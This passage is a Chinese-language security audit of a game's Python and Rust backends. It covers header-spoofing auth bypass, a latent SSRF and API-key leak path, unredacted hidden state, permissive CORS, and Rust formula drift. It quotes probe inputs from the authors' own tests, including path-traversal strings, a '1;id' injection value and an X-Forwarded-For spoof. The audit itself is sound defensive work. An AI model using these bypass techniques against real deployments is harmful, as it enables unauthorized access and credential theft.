# E · 后端安全与 Rust 对拍审查

审查对象：《宋祚 Songzuo》HTTP 后端与安全面（`game/backend/*`、`game/backend_server_entry.py`）
＋ Rust 平行后端（`songzuo_server/src/*.rs`）＋ 跨实现数值/公式对拍。
审查方式：通读源码逐行定位 + 起真实 uvicorn 实例打 HTTP（自建实例，测完全部终止）＋ 进程内定向复现。
环境事实：系统 PATH 无 `cargo`（`Get-Command cargo` 不存在、`~/.cargo/bin/cargo.exe` 与常见安装路径均无），
**Rust 侧仅做静态阅读**（未 `cargo check`）；Python 侧全部结论均有实跑证据。

- 证据目录：`D:\codebuddy\sz\_dev_tools\_scratch\audit-2026\`（脚本与原始输出）
- 未修改 `sz\game` 下任何源文件；未留下 `ai_config.json`；探针写入的 `slot_*.json` 已全部清理
  （残留 `slot_0/1/2/4/6/7/9.db` 等非本审查产生，属并行审查进程）

## 结论速览

| 编号 | 严重度 | 一句话 | 文件:行 | 证据类型 |
|---|---|---|---|---|
| E-1 | P1 | `/api/load` 失败（槽不存在/档损坏）→ 500，且**全局会话状态被清空**，之后所有端点 409 | `backend/server.py:398-404` | 确认（实测） |
| E-2 | P1 | 无 `ai_config.json` 时 `POST /api/advance` 未捕获 `AIRuntimeError` → 500，无结构化错误码，且与模块文档"本地降级模板"自相矛盾 | `backend/server.py:326-345` + `core/commands.py:258-259` | 确认（实测+日志栈） |
| E-3 | P1 | 回环判定吃 `X-Forwarded-For`：同机反代下 `XFF: 127.0.0.1` 可冒充本机，未配 token 即完全放行 | `backend/server.py:66-102` | 确认（实测 T2/T3/T9） |
| E-4 | P1 | `/api/fetch_models` 恒不联网（`_http_get_json` 未导入→NameError 被吞）→ 恒返回硬编码模型表且 `ok:true`；A2 修复成为未执行的死代码 | `ai/client.py:28-30,388,401,406-411` | 确认（实测 A/B/C） |
| E-5 | P1 | `/api/readouts` 原样下发 `finance.corruption_ded` 贪腐扣减真值（14706.6），与"隐性，不进UI明细"注释相反 | `backend/server.py:454-457` + `core/game_state_econ.py:287` | 确认（实测 T47） |
| E-6 | P1 | 快照漏脱敏：`pops.*.wealth/size/grain`（士绅 wealth 12,388,198）、`spy_network` 原样下发 | `backend/server.py:192-231` | 确认（实测 T38/T44） |
| E-7 | P1 | `_state_to_dict` 里 `_ai_failures → ai_failures` 分支不可达（被 `_` 前缀过滤先吃）＝AI 失败披露功能从未生效 | `backend/server.py:201-203,217-225` | 确认（实测 final_checks） |
| E-8 | P1 | Rust 端直接序列化 GameState：`loyalty`/`corruption` 真值表、`secret_loyalty`、`spy_network` 全部明文下发 | `state.rs:86,301,335,337` + `server.rs:36-56` | 确认（静态） |
| E-9 | P1 | Rust 只实现 6 个端点，前端实调 19 个 → 切 Rust 后端即大面积 404；Rust 文档还称 Python 有 `/api/state`（并不存在） | `server.rs:9-19` | 确认（静态+端点清单） |
| E-10 | P1 | Rust 默认 `0.0.0.0` + `allow_origin(Any)`：本机运行时任意网页可驱动其 `/api/*`（回环即过鉴权、响应可读） | `main.rs:27-33` + `server.rs:164-179` | 确认（静态） |
| E-11 | P1 | Rust 二税折色用 Python 已废弃的 `monthly_tax` 锚且 `TAX_COLOR_RATE=1.0`，本色粮又未减 `(1-TAX_COLOR_RATE)` → 本色/折色双全额计账 | `settle.rs:213-218,405-410` + `constants.rs:43` | 确认（静态对拍） |
| E-12 | P1 | Rust 支出侧量纲混用：`cash_out`(贯,1e6) 与 `personnel_cash`(万贯,≈37) 直接 `max` → 俸禄整条被 1,000,000 贯旧盘子顶替 | `settle.rs:251,283,333-334` | 确认（静态对拍） |
| E-13 | P1 | Rust 常量漂移 7 项（税率/常支/酒课/损耗/常平线/盐人口基准等，见对拍表） | `constants.rs:30,35-36,41,43,45,48` | 确认（脚本对拍） |
| E-14 | P1 | Rust 存档与 Python **不互通**，但 `save.rs` 明确宣称"Python 端可直接读 Rust 存的档"，与 `main.rs` 自相矛盾；实测读入后路数/单位/口径全面错位 | `save.rs:1-9` + `main.rs:7-9` | 确认（实测 interop） |
| E-15 | P2 | `hmac.compare_digest` 遇非 ASCII Authorization 抛 `TypeError` → 500（token 本身非 ASCII 则鉴权全挂） | `backend/server.py:94` | 确认（实测 T13） |
| E-16 | P2 | 无请求体大小上限：5MB body 正常 200 处理 | `backend/server.py:263-309` | 确认（实测 T58） |
| E-17 | P2 | `/api/save` 槽位无范围校验：`slot=-1/999999/True` 直接落盘，`save_slots` 只报 1..5 → 孤儿档；`load` 巨大 slot → 500 | `backend/server.py:275-277,385-395` | 确认（实测 T27/T32/T33） |
| E-18 | P2 | `/api/ai_config` 先写盘后探测且不回滚；省略 `api_key` 即保留旧 key → 可把已存 key 指向任意 base_url（跨站简单请求已被 422 拦下，非 CSRF） | `backend/server.py:788-823` | 确认（实测 U22 + csrf_probe） |
| E-19 | P2 | Rust token 不做 `strip`（Python 做），同一环境变量两端语义不同 | `server.rs:150-152` vs `server.py:63` | 确认（实测 V1/V2） |
| E-20 | P2 | `SONGZUO_CORS_ORIGINS='*'` + credentials → Starlette 回显任意 Origin（默认白名单安全，已验证） | `backend/server.py:42-55` | 确认（实测 V4） |
| E-21 | P2 | Rust `settle_granary` 恒等断言符号写反（canal/grain_out 对调）→ debug 构建每月 panic | `settle.rs:526-529` | 确认（静态） |
| E-22 | P2 | Rust `ai.rs` 为孤儿文件（无 `mod ai;`、全 crate 无引用），`server.rs:282` 却写"AI 模块已移除"；Cargo.toml 留未用 `reqwest`/`llm` | `ai.rs`（全文件）+ `main.rs:14-19` | 确认（静态） |
| E-23 | P2 | HttpBackend：`save_slots()` 永不调服务端（读本地盘冒充远端）；`_NON_IDEMPOTENT` 漏 `/api/new_game`；连接重置类错误被当"发送前失败"且该重试分支无幂等守卫 → 非幂等端点可能重复执行 | `backend/client.py:328-336,342-345,352-353,356-369,416-421` | 确认（静态） |
| E-24 | P2 | Rust 事件系统占位（`choices: []`）且从不清 `active_events` → 事件永久累积（快照无界增长），resolve 恒空消息 | `commands.rs:126-137` | 确认（静态） |
| E-25 | P2 | 全局锁内做 AI 联网调用（单次最长 30s+），任一慢 AI 请求阻塞全部端点 | `backend/server.py:321-345` | 确认（静态） |
| E-26 | P2 | Rust 存档目录默认 `/data/saves`（Windows 解析为 `X:\data\saves`），与 Python `Documents\宋祚\saves` 永不重合；Rust 无 `.corrupt` 备份 | `save.rs:17-24,60-69` | 确认（静态） |
| E-27 | P2 | `backend/client.py` 同一文件内对 Rust 后端自相矛盾（:11"原 Rust 方案未采" vs :292-297"Rust 简化版 MVP 在线"） | `backend/client.py:11,292-297` | 确认（静态） |

**P0：0 条。** 默认配置（绑 `127.0.0.1`、未设 token、默认 CORS 白名单）下未发现可被"非本机、无凭据"攻击者利用的 P0 路径：
跨站读被默认 CORS 白名单挡住（OPTIONS 预检实测 400 `Disallowed CORS origin`），跨站写被 Content-Type 校验挡住（实测 422）。
但 **E-3（XFF 冒充回环）与 E-18（凭据重定向）串联**，在"同机反向代理 + 未设 token"的部署下等价于无交互的
远程状态操控 + AI Key 外泄 → 该拓扑下应升级为 P0 处理。

---

## 详细条目

### E-1 [P1] `/api/load` 失败即 500 并清空服务端会话状态

- 位置：`backend/server.py:398-404`
- 证据：[确认] 实测 + 代码。`api_load` 把返回值直接赋给全局 `_state`，**赋值先于任何校验**：

```python
@app.post("/api/load")
def api_load(req: SlotReq, request: Request):
    global _state
    _require_auth(request)
    with _lock:
        _state = _backend.load(req.slot)      # 槽不存在/档损坏 → None
        return {"state": _state_to_dict(_state)}   # vars(None) → TypeError → 500
```

`core/save_load.py:219-239` 在"文件不存在"与"JSON 损坏"两种情况下都 **return None**（后者还会把档改名为 `.corrupt`）。
实测（`probe2.py`，server :18086）：

```
[U1] POST new_game => 200
[U2] POST advance => (500, 'Internal Server Error')      # 另见 E-2
[U3] POST load 不存在槽 => (500, 'Internal Server Error')
[U4] load 失败后 POST advance => (409, '{"detail":"尚未开局，请先行开新局。"}')
[U5] load 失败后 GET readouts => (409, ...)
[U7] POST load 损坏档 => (500, 'Internal Server Error')
[U8] 损坏档 load 后 POST advance => (409, ...)
```

- 影响：任何一次读空槽/坏档（前端存档列表里点空槽即是）会静默销毁服务端**当前进行中的整局状态**，
  且此后所有端点返回 409，玩家只能重开或读一个有效档；错误也无从区分"档不存在"与"档损坏"。
  单机语义下不丢磁盘档，故 P1；若部署为多人共用后端则是"任一人读空槽即踢掉他人进度"。
- 验证方式：`python backend\..\..\_dev_tools\_scratch\audit-2026\probe2.py`（U1–U9）
- 建议修复：先取 `s = _backend.load(slot)`，`if s is None: raise HTTPException(404/409, "存档不存在或已损坏")`，
  仅在成功后才 `_state = s`；并给 `load_game` 返回损坏标记以区分两种 404。

### E-2 [P1] 无 AI 配置时 `/api/advance` 抛未捕获异常 → 500（无错误码）

- 位置：`backend/server.py:326-345`；抛出点 `core/commands.py:258-259`
- 证据：[确认] 实测 stack（`_scratch/audit-2026/server2-18086.log`）：

```
File "backend/server.py", line 336, in api_advance
    events, log, report, _state = _backend.advance(_state, _get_ai())
File "core/commands.py", line 259, in settle_turn
    raise AIRuntimeError(AI_ERROR_CODES.get("AI_NOT_CONFIGURED", "AI 未接入"))
core.errors.AIRuntimeError: 未接入 AI：请配置 OpenAI 兼容 API（base_url/api_key/model）
```

响应体只有 `Internal Server Error`（无 `AI_NOT_CONFIGURED`、无中文提示）。同样无 try/except 的还有
`/api/resolve_event`、`/api/save`、`/api/load`、`/api/conclude`、`/api/meter`、`/api/readouts`。
`/api/action` 只捕 `ValueError`（`server.py:358-361`）。
同时 `server.py:12-14` 的模块文档写"无 key 时用禁用客户端，叙事自动走本地降级模板（绝不伪造在线结果）"，
与 `commands.py:251-252`"全游戏级强制 AI…**拒绝式**"矛盾 —— 文档过期。
- 影响：本工作区基线（无 `ai_config.json`）下，推进回合这一核心端点对前端恒为 500；前端只能显示通用失败，
  无法引导"去配置 API"。拒绝式设计无误，错在 HTTP 层未做错误映射。
- 验证方式：`_scratch/audit-2026/probe2.py` U1–U2 + 上引日志
- 建议修复：在 `server.py` 统一 `@app.exception_handler(AIRuntimeError)` → 409 `{"code":"AI_NOT_CONFIGURED", ...}`；
  更新模块文档第 12-14 行。

### E-3 [P1] 回环放行依赖 uvicorn 已信任的 `X-Forwarded-For`

- 位置：`backend/server.py:66-102`（`_client_is_loopback` 取 `request.client.host`）
- 证据：[确认] 实测。`uvicorn.run(app, host, port)` 默认 `proxy_headers=True`、`forwarded_allow_ips="127.0.0.1"`，
  即"当对端是 127.0.0.1 时改信 X-Forwarded-For"。实测三组（`http_probe.py`，A=:18080 无 token，C=`uvicorn backend.server:app --host 0.0.0.0` 绕过 `main()` 校验）：

```
[T2] 无token+XFF:8.8.8.8  (对端=127.0.0.1) => 401   ← 证明 XFF 生效、client.host 已被 XFF 改写
[T3] 无token+XFF:127.0.0.1(对端=127.0.0.1) => 200   ← 冒充回环成功
[T9] 非回环直连(192.168.1.35) +XFF:127.0.0.1 => 401 ← 对端非回环时 uvicorn 忽略 XFF（此路径安全）
```

- 影响：把后端放在**同机反向代理**（nginx/caddy/Cloudflare Tunnel 本地端）后面且未设 token 时，
  任意互联网访问者携带 `X-Forwarded-For: 127.0.0.1` 即被判定为本机 → 全部 `/api/*` 匿名可用
  （读军政/群臣档案、改状态、下诏）。这正是"未配 token 只放行回环"想防的场景，却因判定取值来源被绕过。
  `127.0.0.1.evil.com`、`Host`、`X-Real-IP` 本身不含在内（实测 T4/T5 因对端本就是回环而无区分力，
  但代码只读 `request.client.host`，这三个头不参与判定）——问题只在 XFF。
- 验证方式：`_scratch/audit-2026/http_probe.py` T2/T3/T9
- 建议修复：`uvicorn.run(..., proxy_headers=False)`（或在 `main()` 里显式关掉）后，仅凭真实对端 IP 判定；
  需要真实反代时强制 token（`main()` 已有 host 校验，应对"代理模式"另设显式开关 + 必填 token）。

### E-4 [P1] `/api/fetch_models` 恒不联网，恒返回硬编码清单 + `ok:true`；A2 修复是未执行的死代码

- 位置：`backend/server.py:741-775` → `ai/client.py:382-411`
- 证据：[确认] 实测。`ai/client.py:28-30` 从 `ai.client_utils` 导入了一长串名字，**唯独没有 `_http_get_json`**
  （对比：`_http_post_json` 在列、`probe()` 走 `_http_post_json` 正常）；而 `client.py:388,401` 直接引用 `_http_get_json`：

```python
28: from ai.client_utils import (
29:     _ai_unavailable, ..., _http_post_json, ..., tier_to_value,
30: )
388:     status, body, _ = _http_get_json(self.models_url, headers, timeout=timeout)   # NameError
406: except Exception as e:   # noqa: BLE001  ← NameError 被吞
411: return ["deepseek-chat", "deepseek-reasoner", "gpt-4o", "gpt-4o-mini", "qwen-plus", "qwen-turbo"]
```

实测（`ssrf_probe.py`）：

```
A) 'ai.client' 模块内是否存在 _http_get_json: False
A) 未注入名字 fetch_available_models() = ['deepseek-chat', ...,'qwen-turbo']   本地端点收到的请求 = []
B) 注入后 fetch_available_models() = ['stolen-model']   本地端点收到 = [{"auth":"Bearer sk-server-secret",...}]
C) 经 302 重定向链 = 两个主机都收到 Authorization: Bearer sk-server-secret
```

HTTP 层同证（`http_probe.py`）：`POST /api/fetch_models {"base_url":"http://127.0.0.1:18083/v1","api_key":"sk-attacker"}`
→ `200 {"ok":true,"models":[6 个硬编码模型]}`，而本地"攻击者"服务器**一个请求都没收到**（T52/T53）；
指向已关闭端口同样 `ok:true`（T56）。
- 影响：(a) 功能失效——设置面板"探测模型"永远显示与真实 Key 无关的清单，用户会选到不可用模型；
  (b) 更危险的是**安全修复未被验证**：A2 的"仅当目标与已配置端点一致才复用服务端 Key + 强制 http(s)"
  逻辑写在一个从不执行的路径上。一旦有人顺手补上 import，立即恢复 SSRF（服务端向客户端指定地址外联）
  与凭据外泄路径——且 B/C 实测表明该路径**跟随 302 并把 `Authorization` 转发到另一个主机**，
  亦即"目标必须等于已配置端点"的字符串守卫**约束不了重定向落点**。
- 验证方式：`_scratch/audit-2026/ssrf_probe.py`（A/B/C/D 四组）
- 建议修复：补 `_http_get_json` 到 `client.py:28` 的导入列表（或改走 `client_utils` 模块调用）；
  同时把 `fetch_available_models` 的异常改为区分"探测失败"与"无可用模型"并让 HTTP 层返回 `ok:false`；
  外联处禁用重定向（urllib 自定义 `HTTPRedirectHandler`）或对重定向目标重跑同一套 URL 白名单。

### E-5 [P1] `/api/readouts` 下发贪腐扣减真值

- 位置：`backend/server.py:454-457` → `core/game_state_econ.py:275-300`
- 证据：[确认] 实测 T47：`GET /api/readouts` → `finance.corruption_ded = 14706.599999999999`。
  而 `game_state_econ.py:287` 自带注释："`"corruption_ded": corruption_cash_ded,  # 月吏俸缺口贪腐扣减（隐性，不进UI明细）`"。
  `readouts` 完全绕过 `_state_to_dict`（`_json_safe(s.finance_readout())` 直出），故没有任何档位化处理。
- 影响：贪腐是隐藏维度（项目自述铁律 6，`state.py:334` 亦把 loyalty/corruption 列为"后台隐藏态"），
  客户端（玩家本机）可直接读取中央贪腐扣减金额反推 gap×贪腐率 → 又可由 `finance` 各分项反推吏俸缺口。
- 验证方式：`_scratch/audit-2026/http_probe.py` T46/T47（需先 `new_game`）
- 建议修复：`readouts.finance` 走一层白名单（去掉 `corruption_ded`，或替换为档位词），
  与 `_state_to_dict` 共用同一脱敏函数。

### E-6 [P1] 状态快照漏脱敏：`pops.*.wealth`、`spy_network` 原样下发

- 位置：`backend/server.py:192-231`（只处理 `loyalty`/`corruption`/`minister_estate`/`pending_secret_decrees`）
- 证据：[确认] 实测 T38/T44（`http_probe.py`）与 `final_checks.py`：

```
pops 字段数=740  样例={"prefectures.京畿路.pops.农.size":4971040,"...pops.农.wealth":516174}
                      ..."prefectures.京畿路.pops.士绅.wealth":12388198
spy_network 字段数=7  样例={"spy_network.新党":0.0,"spy_network.旧党":0.0}（宫禁 0.5）
```

`loyalty`/`corruption` 已正确档位化（T39/T40：`[["韩忠彦","怨望"],...]`、`[["蔡京","贪墨"],...]`），
`minister_estate` 档位词（T41），`secret_loyalty` 剔除（T42），数值残留检查 T43 为空 —— 历史修复**确实生效**。
但同一函数对"POP 层真值财富"（士绅 1238 万贯）、皇城司 `spy_network` 强度不做处理。
- 影响：与项目自述的隐藏维度纪律不一致；`/api/readouts` 可进一步交叉验证。
  （若项目认为 POP 财富与 spy 网络属公开读数，应在 `_state_to_dict` 里注明，避免后续误判为漏脱敏。）
- 验证方式：`_scratch/audit-2026/http_probe.py` T38/T44；`final_checks.py`（抽查 5 类）
- 建议修复：为 `prefectures[*].pops`、`spy_network` 增加白名单/档位化策略，或明确其公开性。

### E-7 [P1] `_ai_failures → ai_failures` 分支不可达（死代码）

- 位置：`backend/server.py:201-203` 与 `217-225`
- 证据：[确认] 实测（`final_checks.py`）：

```python
201: for k, v in vars(s).items():
202:     if k.startswith("_"):
203:         continue          # ← _ai_failures 在此已被跳过
...
217:     if k == "_ai_failures" and isinstance(v, list):   # ← 永不可达
```

```
state._ai_failures 存在: True
快照含 'ai_failures' 键: False     快照含 '_ai_failures' 键: False
```

- 影响：注释所述"AI 失败对玩家披露（除 economy 外玩家无从得知哪几项推演未成）"的修复**从未生效**，
  失败静默如旧。属"历史修复未真正修好"。
- 验证方式：`_scratch/audit-2026/final_checks.py`
- 建议修复：把该分支移到 `startswith("_")` 过滤之前（或对 `_ai_failures` 做例外）。

### E-8 [P1] Rust 端不做任何脱敏，隐藏维度明文下发

- 位置：`songzuo_server/src/state.rs:86,301,335,337`；返回处 `server.rs:36-56,225-236,265-272`
- 证据：[确认] 静态。`ActionResult.state: GameState` 直接 serde 序列化：

```rust
// state.rs
86:    pub secret_loyalty: f64,            // 密旨秘密忠诚
301:   pub spy_network: HashMap<String, f64>,
335:   pub loyalty: HashMap<String, f64>,  // 后台隐藏态
337:   pub corruption: HashMap<String, f64>,
```

Python 端对同名维度强制档位化（`server.py:204-215`），Rust 端 0 处理。
- 影响：同一游戏的两套后端对"铁律 6"执行不一致；指向 Rust 后端时客户端直接拿到 loyalty/corruption 真值、
  密令 `secret_loyalty`、锦衣卫网络强度 → 与前端"只给姿态词"的假设冲突（前端若按词渲染会显示 null/数字）。
- 验证方式：静态（无 cargo，未编译；结论仅依赖 `#[derive(Serialize)]` + 字段清单）
- 建议修复：Rust 侧加 `state_snapshot()` 出口投影（或在 `GameState` 上加 `#[serde(skip_serializing)]` 隐藏字段，
  存档另走完整序列化路径）。

### E-9 [P1] Rust 端点覆盖不足 + 文档自述的 Python 端点不存在

- 位置：`songzuo_server/src/server.rs:9-19,186-200`
- 证据：[确认] 静态 + 前端端点清单（`game/frontend/src` 全量 `"/api/..."` 提取）：

```
前端实调（19）：new_game advance action resolve_event save load save_slots readouts meter
               meter/reset council_review monthly_report conclude ai_config fetch_models
               decree/{polish,draft,discard}
Rust 实现（6）：new_game advance action resolve_event save load   （+ / /health /healthz）
```

Rust 自述"Python 端端点更全"并列出 `/api/state` —— 而 `backend/server.py` **没有任何 `/api/state` 路由**
（路由全集见 `server.py:312-823` 的 `@app.*`），属过期注释。
- 影响：把 Electron 前端指到 Rust 后端（README 所设"云端备选"路径）→ 存档列表、军政读数、计量表、
  会签、月折、结局评定、圣旨润色、AI 配置全部 404；错误码亦不同（见 E-9 附注）。
- 建议修复：Rust 端补齐端点或在前端按后端能力降级；订正 `server.rs:9-12` 的端点清单。
- 附注（错误码分歧，静态）：未开局 Rust 返 **400** `"尚未开局"`（`server.rs:243,279,299,323`）而 Python 返 **409**；
  存档不存在 Rust 返 **404**（`server.rs:343`）而 Python 返 **500**（E-1）；
  未知事件 Rust 返 **200 + "无此事件。"**（`commands.rs:157-158`）而 Python 返 **404**（实测 T62）。

### E-10 [P1] Rust 默认绑 `0.0.0.0` 且 CORS `Any` → 本机浏览器任意站点可操控后端

- 位置：`songzuo_server/src/main.rs:27-33`；`server.rs:164-179`
- 证据：[确认] 静态：

```rust
// main.rs
27: let addr = if let Ok(a) = std::env::var("SONGZUO_ADDR") { a }
29:     else if let Ok(port) = std::env::var("PORT") { format!("0.0.0.0:{}", port) }
31:     else { "0.0.0.0:8080".into() };        // 无 token 也不拒绝启动（Python main() 会拒绝）
// server.rs
175: _ => CorsLayer::new().allow_origin(Any).allow_methods(Any).allow_headers(Any),
```

- 影响：Rust 后端在本机运行时，"未配 token → 仅回环放行"意味着**浏览器发起**的请求天然通过鉴权
  （对端即 127.0.0.1），而 `allow_origin(Any)` 使任意网站可读响应 → 用户访问一个恶意页面即可
  全量读取/操控本机游戏后端。Python 端默认白名单可挡（实测 OPTIONS 预检 400 `Disallowed CORS origin`），
  故这是**两端安全姿态不一致**（Rust 明显更弱）。另：Rust 无需 token 即可绑 0.0.0.0，安全完全依赖
  `auth_mw` 无回归，少了 Python 的启动期兜底。
- 建议修复：Rust 默认 CORS 收窄为回环来源；未设 token 且绑非回环时拒绝启动（对齐 Python `main()`）。

### E-11 [P1] Rust 二税折色口径漂移 → 本色粮双全额计账

- 位置：`songzuo_server/src/settle.rs:213-218,395-419`；`constants.rs:43`
- 证据：[确认] 静态对拍：

```rust
// settle.rs:213-218 折色：用 monthly_tax 锚 × TAX_COLOR_RATE
let base = p.get("monthly_tax")...;                     // 万贯锚
tax_color_total += base * arrival * tax_coeff * rm * TAX_COLOR_RATE;   // TAX_COLOR_RATE = 1.0
// settle.rs:405-410 本色：没有 (1 - TAX_COLOR_RATE)
let inflow = gy / 12.0 * LAND_TAX_RATE_BENEFIT * arrival * harvest * (1.0 - hidden) * (0.8 + 0.4*hyd);
```

Python 同两笔账互为消长（`game_state_econ.py:337-338,357`）：

```python
grain_annual = gy * LAND_TAX_RATE_BENEFIT * ...        # 田赋本色
inc   = grain_annual * TAX_COLOR_RATE * grain_price / 12      # 折色 = 本色 × 折色率(0.40)
本色  = gy / 3.0 * LAND_TAX_RATE_BENEFIT * ... * (1 - TAX_COLOR_RATE)   # 0.60
```

且 Python 已明确废弃 `monthly_tax` 锚（`game_state_econ.py:324`："二税折色 = 田赋本色（税粮）× 折色率 × 粮价
（**替代凭空 monthly_tax 锚**）"），Rust 仍以该锚作税基。历史 R2-6 的"本色粮双计"只删掉了重复调用
（`settle.rs:484-488` 注释确认已删），**但口径层面的双计仍在**。
- 影响：Rust 端同时按 100% 收本色粮与 100% 折色钱，且折色税基与田赋产出脱钩（产量/粮价变动不影响折色），
  两端收入不可对拍。
- 建议修复：`TAX_COLOR_RATE` 改回 0.40 并在本色式中补 `*(1.0 - TAX_COLOR_RATE)`；折色税基改为
  `grain_yield × LAND_TAX_RATE_BENEFIT × … × TAX_COLOR_RATE × grain_price / 12`。

### E-12 [P1] Rust 支出侧量纲混用，俸禄被旧盘子顶替

- 位置：`songzuo_server/src/settle.rs:251,283,289,308,332-334`
- 证据：[确认] 静态对拍：

```rust
251: let cash_out = (PAY_CASH_BASE as f64 * pay_ratio) as i64;        // 贯：1_000_000
283: army_cash += troops * SOLDIER_PAY_PER_MONTH * strength_factor;   // troops 单位=万 → 结果单位=万贯（≈37）
333: let personnel_cash = (army_cash + official_cash + clerk_cash) as i64;   // ≈37
334: let effective_cash_out = cash_out.max(personnel_cash);            // 1_000_000 恒胜 → 俸禄整条被丢弃
```

Python 同位置是 `effective_cash_out = personnel_cash`（`game_state_econ.py:241-246`），量纲统一为贯。
另 `official_cash = officials × 30 / 10000`（`settle.rs:289`）：Rust 的 `officials` 是每路 `1`（见 E-13 对拍表），
Python 的 per-road 官额 = `round(households × 0.00135)`（`core/game_state.py:491-492`，京畿 1851 人）→ 官/吏基数差 ~1800×。
加俸项也少一个量级：Python `financed = local + payraise_budget * share`（`game_state_econ.py:447`），
Rust `financed = local + payraise_budget * share / 10000.0`（`settle.rs:305,472`）。
- 影响：Rust 端支出恒为 `1_000_000 + 常支 + 岁币`，与军队/官额规模无关；军费开支与人事规模脱钩。
- 建议修复：统一 `army/official/clerk_cash` 到贯（乘 10000）后再取 `max`，或直接改 `effective_cash_out = personnel_cash`。

### E-13 [P1] Rust 常量漂移（含 7 项数值不一致 + 1 项自相矛盾）

- 位置：见下节《Rust ↔ Python 常量对拍表》；脚本 `_scratch/audit-2026/diff_constants.py`
- 证据：[确认] 实跑对拍。要点：
  - `MONTHLY_EXP_CIVIL_BASE`：Python `880_000`（`data.py:165`）vs Rust `1_300_000`（`constants.rs:30`）→ **+47.7%**
  - `TAX_COLOR_RATE`：Python `0.40`（`data.py:171`）vs Rust `1.0`（`constants.rs:43`）→ 见 E-11
  - `WINE_COIN_BASE`：Python `600_000`（`data.py:204`，`game_state.py:211` 实赋 `state.wine_tax`）vs Rust `100_000` → **÷6**
  - `SPARROW_RAT`：`0.012`（`data.py:1647`）vs `0.01`（`constants.rs:45`）
  - `CANAL_LOSS_BASE`：`0.06`（`data.py:1648`）vs `0.04`（`constants.rs:216`）
  - `CHANGPING_LOW`：`0.9`（`data.py:1788`）vs `0.6`（`constants.rs:48`）
  - `SALT_POP_BASE`：Rust `5065.0` 与**自身** 12 路人口合计 `4995` 不符（注释称"开局缩放=1"，实际 `pop_scale=0.986`）
  - `SALT_CAPACITY_BASE`：Python `185_000_000`（斤/年，= 自身 Σsalt）vs Rust `231`（= 自身 Σsalt 索引）→ **量纲不同**
- 影响：Rust 端财政/仓廪/盐课/酒课整体与 Python 不可对拍；其中 `WINE_COIN_BASE`、`MONTHLY_EXP_CIVIL_BASE`
  直接影响内帑与国库走向。
- 验证方式：`python _dev_tools\_scratch\audit-2026\diff_constants.py`（输出见 `constants-diff.txt`）

### E-14 [P1] Rust 与 Python 存档实际不互通（且方案内自相矛盾）

- 位置：`songzuo_server/src/save.rs:1-9` vs `main.rs:7-9`
- 证据：[确认] 实测 + 静态。`save.rs:8`："Rust 写出的 JSON 包含 Python load_game 读取的全部字段（用 serde 默认对齐），
因此 Python 端可直接读 Rust 存的档"；`main.rs:7-9` 却写"数值口径与 Python 原型端**不必一致**、**存档字段也暂不互通**…
不要期望跨端读取同一存档"。实测（`rust_save_interop.py`，patch `SAVE_DIR` 到临时目录，未触碰玩家存档）：

```
1) load_game(Rust 口径档) -> OK
2) prefectures 路数: 22 （Python 默认 20 路 + Rust 路键合并）
3) 缺 pops 的路（Rust 键，Python 无法迁移）: ['东京开封府','河东']
4) granary(granary_cap) 读回: 1500.0 ( 2000.0 )   ← Python 口径应为 15_000_000 石 / 20_000_000 石（差 1e4）
5) 路键是否重复语义（东京开封府 vs 京畿路）: True
6) finance_readout() -> AttributeError: 'NoneType' object has no attribute 'get'
```

根因（静态）：`core/save_load.py:434` `_merge_regions(state.prefectures, data.get("prefectures"))` →
`save_load.py:213-216` 对同名键执行 `target[key].update(val)`（用 Rust 的**万级**数值覆盖 Python 的
真实人口/田亩/月税），对陌生键直接新增；而 `save_load.py:512-517` 只对 `PREFECTURE_INFO` 里有的路补 `pops`，
陌生键的 `pops` 永久缺失。Rust 的 12 个路键中有 **10 个与 Python 同名**（京西路/河北路/陕西路/两浙路/
江南东路/江南西路/荆湖南路/福建路/成都府路/广南东路），2 个陌生（东京开封府、河东）。
Rust 的 `land/coin/jiaozi/maritime/bank/standard = null` 亦被 Python 读成 `None` → 任何 `self.coin.get(...)` 即崩。
- 影响：跨端读档会得到"32 路、10 路数值被改写、太仓近乎空仓、读数端点 500"的状态；`save.rs` 的承诺不成立。
- 验证方式：`python _dev_tools\_scratch\audit-2026\rust_save_interop.py`
- 建议修复：二选一并同步两处注释——(a) 明确不互通，删除 `save.rs:8` 的兼容承诺并在 `load_game` 加
  `schema_version`/来源校验；(b) 真做互通：Rust 端输出 Python 口径单位（石/贯/口），
  `_merge_regions` 改为白名单字段级合并。

### E-15 [P2] `hmac.compare_digest` 遇非 ASCII 头值抛异常 → 500

- 位置：`backend/server.py:92-96`
- 证据：[确认] 实测 T13：`Authorization: Bearer café`（latin-1 字节）→ `500 Internal Server Error`
  （Starlette 以 latin-1 解码头值，`hmac.compare_digest` 对含非 ASCII 的 `str` 抛
  `TypeError: comparing strings with non-ASCII characters is not supported`）。
  同类：若运维把 `SONGZUO_SERVER_TOKEN` 设为中文（本项目语境下很可能），则**所有**请求都 500，401 分支永不可达。
- 影响：未授权的任一客户端可稳定触发 500（日志噪声/掩盖真实失败）；配置中文 token 直接不可用。
- 建议修复：`hmac.compare_digest(auth.encode("utf-8","surrogateescape"), want.encode("utf-8"))` 比 bytes，
  或先 `auth.isascii()` 判定后走普通分支。

### E-16 [P2] 无请求体大小上限

- 位置：`backend/server.py:263-309`（`ActionReq.params: dict` 无长度约束）
- 证据：[确认] 实测 T58：`POST /api/action` 带 5 MiB `params` → `200`（正常处理）。
- 影响：单会话服务端内存/CPU 放大（递归 `_json_safe`、pydantic 校验、`params` 深拷贝），
  叠加 E-25 的锁内串行 → 易造成可用性下降。
- 建议修复：`uvicorn.run(..., limit_max_requests=...)` 不适用，改用 Starlette 中间件校验 `Content-Length`
  （如 >1 MiB → 413），并对 `params` 做深度/键数限制。

### E-17 [P2] 槽位无范围校验 → 落盘孤儿档 / 500

- 位置：`backend/server.py:275-277,385-395`；`core/save_load.py:10-12,589-614`
- 证据：[确认] 实测：`/api/save {"slot":-1}` → `200 {"ok":true,"slot":-1}`，落盘 `slot_-1.json`；
  `{"slot":999999}` → 200 并落盘；`{"slot":True}` → 走 `/api/load` 时 500（`slot_True.json`）。
  `get_save_slots()` 只遍历 `range(1, 6)` → 这些档永不出现在列表里。
  路径穿越本身**不可行**：`SlotReq.slot: int` 经 pydantic 强转，实测 `"../../etc/passwd"`/`"..\\..\\win.ini"`/
  `"CON"`/`"NUL"`/`"1;id"`/`"1\x00"`/`""`/`null`/`1.5` 全部 422（T18–T29，Windows 保留名同样过不了 int 校验）。
- 影响：垃圾档堆积（占磁盘、无法在 UI 删除）；`slot=True`→`slot_True.json` 无语义。
